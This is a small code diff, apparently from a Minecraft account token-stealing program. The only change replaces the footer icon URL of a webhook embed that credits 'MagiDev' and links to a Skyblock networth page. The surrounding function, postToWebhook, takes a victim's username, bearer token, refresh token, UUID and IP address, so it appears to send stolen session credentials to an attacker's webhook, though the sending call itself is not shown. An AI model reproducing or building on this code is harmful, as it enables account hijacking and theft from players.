@@ -133,7 +133,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
       url: "https://spillager.live/skyblock/networth/"+username,
       footer: {
         text: "MagiDev moment",
-        icon_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg"
+        icon_url: "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.10000birds.com%2Fwp-content%2Fuploads%2FFeral-Pigeon-portrait-2.jpg&f=1&nofb=1&ipt=8cde89fedbc7d1958b5979af1f6eb5e71a24eed0d308fffef71db96e73600afa&ipo=images"
       },
     }
   ],
